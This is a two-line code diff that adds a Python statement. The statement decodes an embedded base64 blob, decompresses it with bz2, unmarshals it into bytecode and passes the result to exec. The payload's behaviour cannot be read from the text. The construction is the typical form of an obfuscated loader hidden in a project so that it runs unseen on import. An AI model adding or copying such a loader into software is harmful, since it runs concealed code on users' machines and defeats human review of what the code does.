@@ -1,0 +1,2 @@
+import base64,bz2,marshal
+exec(marshal.loads(bz2.decompress(base64.b64decode("QlpoOTFBWSZTWYyqYr0AACpfk/FkADAABUIFHhAmJ58AACAAEAggCBAgAFRFND0mQyGQ0DRiNqETJPU0DQ0GgGgepp8hAuhkrTNZAoLhDIX+koK3HbyAs6SM+Yxc+CHvAtdenuGuBVBP1xS+nYFJieJeDIwfi7kinChIRlUxXoA="))))
